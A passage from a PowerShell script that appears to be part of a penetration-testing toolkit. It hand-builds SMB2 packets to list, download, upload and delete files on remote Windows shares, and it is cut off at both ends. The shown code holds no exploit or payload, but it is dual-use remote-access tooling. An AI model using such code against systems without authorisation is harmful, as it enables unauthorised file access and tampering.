                    $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                    if($SMB_signing)
                    {
                        $SMB2_sign = $SMB2_header + $SMB2_data 
                        $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                        $SMB2_signature = $SMB2_signature[0..15]
                        $packet_SMB2_header["Signature"] = $SMB2_signature
                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                    }

                    $SMB_client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data
                    $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                    $SMB_client_stream.Flush()
                    $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
                    $SMB2_tree_ID = 0x00,0x00,0x00,0x00
                    $SMB_client_stage = 'TreeConnect'
                }
                
                'CreateRequest'
                {
                    $SMB2_message_ID++
                    $packet_SMB2_header = New-PacketSMB2Header 0x05,0x00 0x01,0x00 $SMB2_message_ID $process_ID_bytes $SMB2_tree_ID $SMB_session_ID
                
                    if($SMB_signing)
                    {
                        $packet_SMB2_header["Flags"] = 0x08,0x00,0x00,0x00      
                    }
                    
                    $packet_SMB2_data = New-PacketSMB2CreateRequest $SMB2_file $create_request_extra_info $source_file_size

                    if($directory_list.Count -gt 0)
                    {
                        $packet_SMB2_data["DesiredAccess"] = 0x81,0x00,0x10,0x00
                        $packet_SMB2_data["ShareAccess"] = 0x07,0x00,0x00,0x00
                    }
                    
                    if($Action -eq 'Delete')
                    {

                        switch($action_step)
                        {
                            
                            0
                            {
                                $packet_SMB2_data["CreateOptions"] = 0x00,0x00,0x20,0x00
                                $packet_SMB2_data["DesiredAccess"] = 0x80,0x00,0x00,0x00
                                $packet_SMB2_data["ShareAccess"] = 0x07,0x00,0x00,0x00
                            }

                            2
                            {
                                $packet_SMB2_data["CreateOptions"] = 0x40,0x00,0x20,0x00
                                $packet_SMB2_data["DesiredAccess"] = 0x80,0x00,0x01,0x00
                                $packet_SMB2_data["ShareAccess"] = 0x07,0x00,0x00,0x00
                            }

                        }

                    }

                    if($Action -eq 'Get')
                    {
                        $packet_SMB2_data["CreateOptions"] = 0x00,0x00,0x20,0x00
                        $packet_SMB2_data["DesiredAccess"] = 0x89,0x00,0x12,0x00
                        $packet_SMB2_data["ShareAccess"] = 0x05,0x00,0x00,0x00
                    }

                    if($Action -eq 'Put')
                    {
                    
                        switch($action_step)
                        {

                            0
                            {
                                $packet_SMB2_data["CreateOptions"] = 0x60,0x00,0x20,0x00
                                $packet_SMB2_data["DesiredAccess"] = 0x89,0x00,0x12,0x00
                                $packet_SMB2_data["ShareAccess"] = 0x01,0x00,0x00,0x00
                                $packet_SMB2_data["RequestedOplockLevel"] = 0xff
                            }

                            1
                            {
                                $packet_SMB2_data["CreateOptions"] = 0x64,0x00,0x00,0x00
                                $packet_SMB2_data["DesiredAccess"] = 0x97,0x01,0x13,0x00
                                $packet_SMB2_data["ShareAccess"] = 0x00,0x00,0x00,0x00
                                $packet_SMB2_data["RequestedOplockLevel"] = 0xff
                                $packet_SMB2_data["FileAttributes"] = 0x20,0x00,0x00,0x00
                                $packet_SMB2_data["CreateDisposition"] = 0x05,0x00,0x00,0x00
                            }

                        }

                    }

                    $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                    $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data  
                    $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
                    $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                    if($SMB_signing)
                    {
                        $SMB2_sign = $SMB2_header + $SMB2_data  
                        $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                        $SMB2_signature = $SMB2_signature[0..15]
                        $packet_SMB2_header["Signature"] = $SMB2_signature
                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                    }

                    $SMB_client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data
                    $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                    $SMB_client_stream.Flush()
                    $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
                    
                    if([System.BitConverter]::ToString($SMB_client_receive[12..15]) -ne '00-00-00-00')
                    {

                        $error_code = [System.BitConverter]::ToString($SMB_client_receive[12..15])

                        switch($error_code)
                        {

                            '03-01-00-c0'
                            {
                                $SMB_client_stage = 'Exit'
                            }

                            '22-00-00-c0'
                            {

                                if($directory_list.Count -gt 0)
                                {
                                    $directory_list.RemoveAt(0) > $null
                                }
                                else
                                {
                                    $output_message = "[-] Access denied"
                                    $share_subdirectory_start = $false
                                }

                                $SMB_client_stage = 'CloseRequest'

                            }

                            '34-00-00-c0'
                            {

                                if($Action -eq 'Put')
                                {
                                    $create_request_extra_info = 3
                                    $action_step++
                                    $SMB_client_stage = 'CreateRequest'
                                }
                                else
                                {
                                    $output_message = "[-] File not found"
                                    $SMB_client_stage = 'Exit'
                                }

                            }

                            'ba-00-00-c0'
                            {
                                
                                if($Action -eq 'Put')
                                {
                                    $output_message = "[-] Destination filname must be specified"
                                    $SMB_client_stage = 'CloseRequest'
                                }

                            }

                            default
                            {
                                $error_code = $error_code -replace "-",""
                                $output_message = "[-] Create request error code 0x$error_code"
                                $SMB_client_stage = 'Exit'
                            }

                        }

                    }
                    elseif($Action -eq 'Delete' -and $action_step -eq 2)
                    {
                        $set_info_request_file_info_class = 0x01
                        $set_info_request_info_level = 0x0d
                        $set_info_request_buffer = 0x01,0x00,0x00,0x00
                        $SMB_file_ID = $SMB_client_receive[132..147]
                        $SMB_client_stage = 'SetInfoRequest'
                    }
                    elseif($Action -eq 'Get' -and $action_step -ne 1)
                    {

                        switch($action_step)
                        {

                            0
                            {
                                $SMB_file_ID = $SMB_client_receive[132..147]
                                $action_step++
                                $SMB_client_stage = 'CloseRequest'
                            }

                            2
                            {

                                if($file_size -lt 4096)
                                {
                                    $read_request_length = $file_size
                                }
                                else
                                {
                                    $read_request_length = 4096
                                }

                                $read_request_offset = 0
                                $SMB_file_ID = $SMB_client_receive[132..147]
                                $action_step++
                                $SMB_client_stage = 'ReadRequest'
                            }

                            4
                            {
                                $header_next_command = 0x68,0x00,0x00,0x00
                                $query_info_request_info_type_1 = 0x01
                                $query_info_request_file_info_class_1 = 0x07
                                $query_info_request_output_buffer_length_1 = 0x00,0x10,0x00,0x00
                                $query_info_request_input_buffer_offset_1 = 0x68,0x00
                                $query_info_request_buffer_1 = 0
                                $query_info_request_info_type_2 = 0x01
                                $query_info_request_file_info_class_2 = 0x16
                                $query_info_request_output_buffer_length_2 = 0x00,0x10,0x00,0x00
                                $query_info_request_input_buffer_offset_2 = 0x68,0x00
                                $query_info_request_buffer_2 = 0
                                $SMB_file_ID = $SMB_client_receive[132..147]
                                $action_step++
                                $SMB_client_stage = 'QueryInfoRequest'
                            }

                        }

                    }
                    elseif($Action -eq 'Put')
                    {

                        switch($action_step)
                        {

                            0
                            {

                                if($Action -eq 'Put')
                                {
                                    $output_message = "Destination file exists"
                                    $SMB_client_stage = 'CloseRequest'
                                }

                            }

                            1
                            {
                                $SMB_file_ID = $SMB_client_receive[132..147]
                                $action_step++
                                $header_next_command = 0x70,0x00,0x00,0x00
                                $query_info_request_info_type_1 = 0x02
                                $query_info_request_file_info_class_1 = 0x01
                                $query_info_request_output_buffer_length_1 = 0x58,0x00,0x00,0x00
                                $query_info_request_input_buffer_offset_1 = 0x00,0x00
                                $query_info_request_buffer_1 = 8
                                $query_info_request_info_type_2 = 0x02
                                $query_info_request_file_info_class_2 = 0x05
                                $query_info_request_output_buffer_length_2 = 0x50,0x00,0x00,0x00
                                $query_info_request_input_buffer_offset_2 = 0x00,0x00
                                $query_info_request_buffer_2 = 1
                                $SMB_file_ID = $SMB_client_receive[132..147]
                                $SMB_client_stage = 'QueryInfoRequest'
                            }

                        }

                    }
                    elseif($share_subdirectory_start)
                    {
                        $SMB_file_ID = $SMB_client_receive[132..147]
                        $SMB_client_stage = 'CloseRequest'
                    }
                    elseif($directory_list.Count -gt 0 -or $action_step -eq 1)
                    {
                        $SMB_client_stage = 'FindRequest'
                    }
                    else
                    {
                        $header_next_command = 0x70,0x00,0x00,0x00
                        $query_info_request_info_type_1 = 0x02
                        $query_info_request_file_info_class_1 = 0x01
                        $query_info_request_output_buffer_length_1 = 0x58,0x00,0x00,0x00
                        $query_info_request_input_buffer_offset_1 = 0x00,0x00
                        $query_info_request_buffer_1 = 8
                        $query_info_request_info_type_2 = 0x02
                        $query_info_request_file_info_class_2 = 0x05
                        $query_info_request_output_buffer_length_2 = 0x50,0x00,0x00,0x00
                        $query_info_request_input_buffer_offset_2 = 0x00,0x00
                        $query_info_request_buffer_2 = 1
                        $SMB_file_ID = $SMB_client_receive[132..147]
                        $SMB_client_stage = 'QueryInfoRequest'

                        if($share_subdirectory)
                        {
                            $share_subdirectory_start = $true
                        }

                    }

                }

                'QueryInfoRequest'
                {
                    $SMB2_message_ID++
                    $packet_SMB2_header = New-PacketSMB2Header 0x10,0x00 0x01,0x00 $SMB2_message_ID $process_ID_bytes $SMB2_tree_ID $SMB_session_ID
                    $packet_SMB2_header["NextCommand"] = $header_next_command

                    if($SMB_signing)
                    {
                        $packet_SMB2_header["Flags"] = 0x08,0x00,0x00,0x00      
                    }

                    $packet_SMB2_data = New-PacketSMB2QueryInfoRequest $query_info_request_info_type_1 $query_info_request_file_info_class_1 $query_info_request_output_buffer_length_1 $query_info_request_input_buffer_offset_1 $SMB_file_ID $query_info_request_buffer_1
                    $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                    $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data    

                    if($SMB_signing)
                    {
                        $SMB2_sign = $SMB2_header + $SMB2_data 
                        $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                        $SMB2_signature = $SMB2_signature[0..15]
                        $packet_SMB2_header["Signature"] = $SMB2_signature
                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                    }

                    $SMB2_message_ID++
                    $packet_SMB2b_header = New-PacketSMB2Header 0x10,0x00 0x01,0x00 $SMB2_message_ID $process_ID_bytes $SMB2_tree_ID $SMB_session_ID

                    if($SMB_signing)
                    {
                        $packet_SMB2b_header["Flags"] = 0x0c,0x00,0x00,0x00      
                    }
                    else
                    {
                        $packet_SMB2b_header["Flags"] = 0x04,0x00,0x00,0x00
                    }

                    $packet_SMB2b_data = New-PacketSMB2QueryInfoRequest $query_info_request_info_type_2 $query_info_request_file_info_class_2 $query_info_request_output_buffer_length_2 $query_info_request_input_buffer_offset_2 $SMB_file_ID $query_info_request_buffer_2
                    $SMB2b_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2b_header
                    $SMB2b_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2b_data
                    $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService ($SMB2_header.Length + $SMB2b_header.Length)  ($SMB2_data.Length + $SMB2b_data.Length)
                    $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                    if($SMB_signing)
                    {
                        $SMB2_sign = $SMB2b_header + $SMB2b_data 
                        $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                        $SMB2_signature = $SMB2_signature[0..15]
                        $packet_SMB2b_header["Signature"] = $SMB2_signature
                        $SMB2b_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2b_header
                    }

                    $SMB_client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data + $SMB2b_header + $SMB2b_data
                    $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                    $SMB_client_stream.Flush()
                    $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null

                    if($share_subdirectory_start)
                    {
                        $SMB2_file = [System.Text.Encoding]::Unicode.GetBytes($share_subdirectory)
                        $root_directory = $SMB2_file + 0x5c,0x00
                        $create_request_extra_info = 1
                        $SMB_client_stage = 'CreateRequest'
                    }
                    elseif($Action -eq 'Get')
                    {

                        switch($action_step)
                        {

                            5
                            {
                                $query_info_response = [System.BitConverter]::ToString($SMB_client_receive)
                                $query_info_response = $query_info_response -replace "-",""
                                $file_stream_size_index = $query_info_response.Substring(10).IndexOf("FE534D42") + 170
                                $file_stream_size = [System.BitConverter]::ToUInt32($SMB_client_receive[($file_stream_size_index / 2)..($file_stream_size_index / 2 + 8)],0)
                                $file_stream_size_quotient = [Math]::Truncate($file_stream_size / 65536)
                                $file_stream_size_remainder = $file_stream_size % 65536
                                $percent_complete = $file_stream_size_quotient

                                if($file_stream_size_remainder -ne 0)
                                {
                                    $percent_complete++
                                }
                                
                                if($file_stream_size -lt 1024)
                                {
                                    $progress_file_size = "" + $file_stream_size + "B"
                                }
                                elseif($file_stream_size -lt 1024000)
                                {
                                    $progress_file_size = "" + ($file_stream_size / 1024).ToString('.00') + "KB"
                                }
                                else
                                {
                                    $progress_file_size = "" + ($file_stream_size / 1024000).ToString('.00') + "MB"
                                }

                                $header_next_command = 0x70,0x00,0x00,0x00
                                $query_info_request_info_type_1 = 0x02
                                $query_info_request_file_info_class_1 = 0x01
                                $query_info_request_output_buffer_length_1 = 0x58,0x00,0x00,0x00
                                $query_info_request_input_buffer_offset_1 = 0x00,0x00
                                $query_info_request_buffer_1 = 8
                                $query_info_request_info_type_2 = 0x02
                                $query_info_request_file_info_class_2 = 0x05
                                $query_info_request_output_buffer_length_2 = 0x50,0x00,0x00,0x00
                                $query_info_request_input_buffer_offset_2 = 0x00,0x00
                                $query_info_request_buffer_2 = 1
                                $action_step++
                                $SMB_client_stage = 'QueryInfoRequest'
                            }

                            6
                            {

                                if($file_stream_size -lt 65536)
                                {
                                    $read_request_length = $file_stream_size
                                }
                                else
                                {
                                    $read_request_length = 65536
                                }

                                $read_request_offset = 0
                                $read_request_step = 1
                                $action_step++
                                $SMB_client_stage = 'ReadRequest'
                            }

                        }
                    }
                    elseif($Action -eq 'Put')
                    {
                        $percent_complete = $source_file_size_quotient

                        if($source_file_size_remainder -ne 0)
                        {
                            $percent_complete++
                        }

                        if($source_file_size -lt 1024)
                        {
                            $progress_file_size = "" + $source_file_size + "B"
                        }
                        elseif($source_file_size -lt 1024000)
                        {
                            $progress_file_size = "" + ($source_file_size / 1024).ToString('.00') + "KB"
                        }
                        else
                        {
                            $progress_file_size = "" + ($source_file_size / 1024000).ToString('.00') + "MB"
                        }

                        $action_step++
                        $set_info_request_file_info_class = 0x01
                        $set_info_request_info_level = 0x14
                        $set_info_request_buffer = [System.BitConverter]::GetBytes($source_file_size)
                        $SMB_client_stage = 'SetInfoRequest'
                    }
                    elseif($Action -eq 'Delete')
                    {
                        $SMB_client_stage = 'CreateRequest'
                    }
                    else
                    {
                        $SMB_client_stage = 'CreateRequestFindRequest'
                    }

                }

                'SetInfoRequest'
                {
                    $SMB2_message_ID++
                    $packet_SMB2_header = New-PacketSMB2Header 0x11,0x00 0x01,0x00 $SMB2_message_ID $process_ID_bytes $SMB2_tree_ID $SMB_session_ID

                    if($SMB_signing)
                    {
                        $packet_SMB2_header["Flags"] = 0x08,0x00,0x00,0x00      
                    }

                    $packet_SMB2_data = New-PacketSMB2SetInfoRequest $set_info_request_file_info_class $set_info_request_info_level $SMB_file_ID $set_info_request_buffer
                    $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                    $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data    
                    $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
                    $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                    if($SMB_signing)
                    {
                        $SMB2_sign = $SMB2_header + $SMB2_data 
                        $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                        $SMB2_signature = $SMB2_signature[0..15]
                        $packet_SMB2_header["Signature"] = $SMB2_signature
                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                    }

                    $SMB_client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data
                    $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                    $SMB_client_stream.Flush()
                    $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null

                    if($source_file_size -le 65536)
                    {
                        $write_request_length = $source_file_size
                    }
                    else
                    {
                        $write_request_length = 65536
                    }

                    $write_request_offset = 0
                    $write_request_step = 1

                    if($Action -eq 'Delete')
                    {
                        $output_message = "[+] File deleted"
                        $SMB_client_stage = 'CloseRequest'
                        $action_step++
                    }
                    elseif($Action -eq 'Put' -and $action_step -eq 4)
                    {
                        $output_message = "[+] File uploaded"
                        $SMB_client_stage = 'CloseRequest'
                    }
                    else
                    {
                        $SMB_client_stage = 'WriteRequest'
                    }

                }

                'CreateRequestFindRequest'
                {
                    $SMB2_message_ID++
                    $packet_SMB2_header = New-PacketSMB2Header 0x05,0x00 0x01,0x00 $SMB2_message_ID $process_ID_bytes $SMB2_tree_ID $SMB_session_ID

                    if($SMB_signing)
                    {
                        $packet_SMB2_header["Flags"] = 0x08,0x00,0x00,0x00      
                    }

                    $packet_SMB2_data = New-PacketSMB2CreateRequest $SMB2_file 1
                    $packet_SMB2_data["DesiredAccess"] = 0x81,0x00,0x10,0x00
                    $packet_SMB2_data["ShareAccess"] = 0x07,0x00,0x00,0x00
                    $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                    $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data
                    $packet_SMB2_header["NextCommand"] = [System.BitConverter]::GetBytes($SMB2_header.Length + $SMB2_data.Length)
                    $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                    $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data

                    if($SMB_signing)
                    {
                        $SMB2_sign = $SMB2_header + $SMB2_data  
                        $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                        $SMB2_signature = $SMB2_signature[0..15]
                        $packet_SMB2_header["Signature"] = $SMB2_signature
                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                    }

                    $SMB2_message_ID++
                    $packet_SMB2b_header = New-PacketSMB2Header 0x0e,0x00 0x01,0x00 $SMB2_message_ID $process_ID_bytes $SMB2_tree_ID $SMB_session_ID
                    $packet_SMB2b_header["NextCommand"] = 0x68,0x00,0x00,0x00

                    if($SMB_signing)
                    {
                        $packet_SMB2b_header["Flags"] = 0x0c,0x00,0x00,0x00      
                    }
                    else
                    {
                        $packet_SMB2b_header["Flags"] = 0x04,0x00,0x00,0x00
                    }

                    $packet_SMB2b_data = New-PacketSMB2FindRequestFile 0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff 0x00,0x00,0x00,0x00,0x00,0x00
                    $SMB2b_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2b_header
                    $SMB2b_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2b_data    

                    if($SMB_signing)
                    {
                        $SMB2_sign = $SMB2b_header + $SMB2b_data 
                        $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                        $SMB2_signature = $SMB2_signature[0..15]
                        $packet_SMB2b_header["Signature"] = $SMB2_signature
                        $SMB2b_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2b_header
                    }

                    $SMB2_message_ID++
                    $packet_SMB2c_header = New-PacketSMB2Header 0x0e,0x00 0x01,0x00 $SMB2_message_ID $process_ID_bytes $SMB2_tree_ID $SMB_session_ID

                    if($SMB_signing)
                    {
                        $packet_SMB2c_header["Flags"] = 0x0c,0x00,0x00,0x00      
                    }
                    else
                    {
                        $packet_SMB2c_header["Flags"] = 0x04,0x00,0x00,0x00
                    }

                    $packet_SMB2c_data = New-PacketSMB2FindRequestFile 0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff
                    $packet_SMB2c_data["OutputBufferLength"] = 0x80,0x00,0x00,0x00
                    $SMB2c_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2c_header
                    $SMB2c_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2c_data    
                    $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService ($SMB2_header.Length + $SMB2b_header.Length + $SMB2c_header.Length)  ($SMB2_data.Length + $SMB2b_data.Length + $SMB2c_data.Length)
                    $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                    if($SMB_signing)
                    {
                        $SMB2_sign = $SMB2c_header + $SMB2c_data 
                        $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                        $SMB2_signature = $SMB2_signature[0..15]
                        $packet_SMB2c_header["Signature"] = $SMB2_signature
                        $SMB2c_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2c_header
                    }

                    $SMB_client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data + $SMB2b_header + $SMB2b_data + $SMB2c_header + $SMB2c_data
                    $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                    $SMB_client_stream.Flush()
                    $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null

                    if($Action -eq 'Delete')
                    {
                        $SMB_client_stage = 'CreateRequest'
                        $SMB2_file = [System.Text.Encoding]::Unicode.GetBytes($share_subdirectory)
                        $action_step++
                    }
                    else
                    {
                        $SMB_client_stage = 'ParseDirectoryContents'
                    }

                }

                'ParseDirectoryContents'
                {
                    $subdirectory_list = New-Object System.Collections.ArrayList
                    $create_response_file = [System.BitConverter]::ToString($SMB_client_receive)
                    $create_response_file = $create_response_file -replace "-",""
                    $directory_contents_mode_list = New-Object System.Collections.ArrayList
                    $directory_contents_create_time_list = New-Object System.Collections.ArrayList
                    $directory_contents_last_write_time_list = New-Object System.Collections.ArrayList
                    $directory_contents_length_list = New-Object System.Collections.ArrayList
                    $directory_contents_name_list = New-Object System.Collections.ArrayList

                    if($directory_list.Count -gt 0)
                    {
                        $create_response_file_index = 152
                        $directory_list.RemoveAt(0) > $null
                    }
                    else
                    {
                        $create_response_file_index = $create_response_file.Substring(10).IndexOf("FE534D42") + 154
                    }

                    do
                    {
                        $SMB_next_offset = [System.BitConverter]::ToUInt32($SMB_client_receive[($create_response_file_index / 2 + $SMB_offset)..($create_response_file_index / 2 + 3 + $SMB_offset)],0)
                        $SMB_file_length = [System.BitConverter]::ToUInt32($SMB_client_receive[($create_response_file_index / 2 + 40 + $SMB_offset)..($create_response_file_index / 2 + 47 + $SMB_offset)],0)
                        $SMB_file_attributes = [Convert]::ToString($SMB_client_receive[($create_response_file_index / 2 + 56 + $SMB_offset)],2).PadLeft(16,'0')

                        if($SMB_file_length -eq 0)
                        {
                            $SMB_file_length = $null
                        }

                        if($SMB_file_attributes.Substring(11,1) -eq '1')
                        {
                            $SMB_file_mode = "d"
                        }
                        else
                        {
                            $SMB_file_mode = "-"
                        }

                        if($SMB_file_attributes.Substring(10,1) -eq '1')
                        {
                            $SMB_file_mode+= "a"
                        }
                        else
                        {
                            $SMB_file_mode+= "-"
                        }

                        if($SMB_file_attributes.Substring(15,1) -eq '1')
                        {
                            $SMB_file_mode+= "r"
                        }
                        else
                        {
                            $SMB_file_mode+= "-"
                        }

                        if($SMB_file_attributes.Substring(14,1) -eq '1')
                        {
                            $SMB_file_mode+= "h"
                        }
                        else
                        {
                            $SMB_file_mode+= "-"
                        }

                        if($SMB_file_attributes.Substring(13,1) -eq '1')
                        {
                            $SMB_file_mode+= "s"
                        }
                        else
                        {
                            $SMB_file_mode+= "-"
                        }

                        $file_create_time = [Datetime]::FromFileTime([System.BitConverter]::ToInt64($SMB_client_receive[($create_response_file_index / 2 + 8 + $SMB_offset)..($create_response_file_index / 2 + 15 + $SMB_offset)],0))
                        $file_create_time = Get-Date $file_create_time -format 'M/d/yyyy h:mm tt'
                        $file_last_write_time = [Datetime]::FromFileTime([System.BitConverter]::ToInt64($SMB_client_receive[($create_response_file_index / 2 + 24 + $SMB_offset)..($create_response_file_index / 2 + 31 + $SMB_offset)],0))
                        $file_last_write_time = Get-Date $file_last_write_time -format 'M/d/yyyy h:mm tt'
                        $SMB_filename_length = [System.BitConverter]::ToUInt32($SMB_client_receive[($create_response_file_index / 2 + 60 + $SMB_offset)..($create_response_file_index / 2 + 63 + $SMB_offset)],0)
                        $SMB_filename_unicode = $SMB_client_receive[($create_response_file_index / 2 + 104 + $SMB_offset)..($create_response_file_index / 2 + 104 + $SMB_offset + $SMB_filename_length - 1)]
                        $SMB_filename = [System.BitConverter]::ToString($SMB_filename_unicode)
                        $SMB_filename = $SMB_filename -replace "-00",""

                        if($SMB_filename.Length -gt 2)
                        {
                            $SMB_filename = $SMB_filename.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
                            $SMB_filename_extract = New-Object System.String ($SMB_filename,0,$SMB_filename.Length)
                        }
                        else
                        {
                            $SMB_filename_extract = [String][Char][System.Convert]::ToInt16($SMB_filename,16)
                        }

                        if(!$Modify)
                        {
                            $file_last_write_time = $file_last_write_time.PadLeft(19,0)
                            [String]$SMB_file_length = $SMB_file_length
                            $SMB_file_length = $SMB_file_length.PadLeft(15,0)
                        }

                        if($SMB_file_attributes.Substring(11,1) -eq '1')
                        {

                            if($SMB_filename_extract -ne '.' -and $SMB_filename_extract -ne '..')
                            {
                                $subdirectory_list.Add($SMB_filename_unicode) > $null
                                $directory_contents_name_list.Add($SMB_filename_extract) > $null
                                $directory_contents_mode_list.Add($SMB_file_mode) > $null
                                $directory_contents_length_list.Add($SMB_file_length) > $null
                                $directory_contents_last_write_time_list.Add($file_last_write_time) > $null
                                $directory_contents_create_time_list.Add($file_create_time) > $null
                            }

                        }
                        else
                        {
                            $directory_contents_name_list.Add($SMB_filename_extract) > $null
                            $directory_contents_mode_list.Add($SMB_file_mode) > $null
                            $directory_contents_length_list.Add($SMB_file_length) > $null
                            $directory_contents_last_write_time_list.Add($file_last_write_time) > $null
                            $directory_contents_create_time_list.Add($file_create_time) > $null
                        }

                        if($share_subdirectory -and !$share_subdirectory_start)
                        {
                            $root_directory_string = $share_subdirectory + '\'
                        }

                        $SMB_offset += $SMB_next_offset
                    }
                    until($SMB_next_offset -eq 0)

                    if($directory_contents_name_list)
                    {

                        if($root_directory_string)
                        {
                            $file_directory = $target_share + "\" + $root_directory_string.Substring(0,$root_directory_string.Length - 1)
                        }
                        else
                        {
                            $file_directory = $target_share
                        }

                    }

                    $directory_contents_output = @()
                    $i = 0

                    ForEach($directory in $directory_contents_name_list)
                    {
                        $directory_object = New-Object PSObject
                        Add-Member -InputObject $directory_object -MemberType NoteProperty -Name Name -Value ($file_directory + "\" + $directory_contents_name_list[$i])
                        Add-Member -InputObject $directory_object -MemberType NoteProperty -Name Mode -Value $directory_contents_mode_list[$i]
                        Add-Member -InputObject $directory_object -MemberType NoteProperty -Name Length -Value $directory_contents_length_list[$i]

                        if($Modify)
                        {
                            Add-Member -InputObject $directory_object -MemberType NoteProperty -Name CreateTime -Value $directory_contents_create_time_list[$i]
                        }

                        Add-Member -InputObject $directory_object -MemberType NoteProperty -Name LastWriteTime -Value $directory_contents_last_write_time_list[$i]
                        $directory_contents_output += $directory_object
                        $i++
                    }

                    if($directory_contents_output -and !$Modify)
                    {

                        if($directory_contents_hide_headers)
                        {
                            ($directory_contents_output | Format-Table -Property @{ Name="Mode"; Expression={$_.Mode }; Alignment="left"; },
                                                                        @{ Name="LastWriteTime"; Expression={$_.LastWriteTime }; Alignment="right"; },
                                                                        @{ Name="Length"; Expression={$_.Length }; Alignment="right"; },
                                                                        @{ Name="Name"; Expression={$_.Name }; Alignment="left"; } -AutoSize -HideTableHeaders -Wrap| Out-String).Trim()
                        }
                        else
                        {
                            $directory_contents_hide_headers = $true
                            ($directory_contents_output | Format-Table -Property @{ Name="Mode"; Expression={$_.Mode }; Alignment="left"; },
                                                                        @{ Name="LastWriteTime"; Expression={$_.LastWriteTime }; Alignment="right"; },
                                                                        @{ Name="Length"; Expression={$_.Length }; Alignment="right"; },
                                                                        @{ Name="Name"; Expression={$_.Name }; Alignment="left"; } -AutoSize -Wrap| Out-String).Trim()
                        }

                    }
                    else
                    {
                        $directory_contents_output
                    }

                    $subdirectory_list.Reverse() > $null

                    ForEach($subdirectory in $subdirectory_list)
                    {  
                        $directory_list.Insert(0,($root_directory + $subdirectory)) > $null
                    }
                    
                    $SMB_offset = 0
                    $SMB_client_stage = 'CloseRequest'
                }
            
                'FindRequest'
                {
                    $SMB_file_ID = $SMB_client_receive[132..147]
                    $SMB2_message_ID++
                    $packet_SMB2_header = New-PacketSMB2Header 0x0e,0x00 0x01,0x00 $SMB2_message_ID $process_ID_bytes $SMB2_tree_ID $SMB_session_ID
                    $packet_SMB2_header["NextCommand"] = 0x68,0x00,0x00,0x00

                    if($SMB_signing)
                    {
                        $packet_SMB2_header["Flags"] = 0x08,0x00,0x00,0x00      
                    }

                    $packet_SMB2_data = New-PacketSMB2FindRequestFile $SMB_file_ID 0x00,0x00,0x00,0x00,0x00,0x00
                    $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                    $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data    

                    if($SMB_signing)
                    {
                        $SMB2_sign = $SMB2_header + $SMB2_data 
                        $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                        $SMB2_signature = $SMB2_signature[0..15]
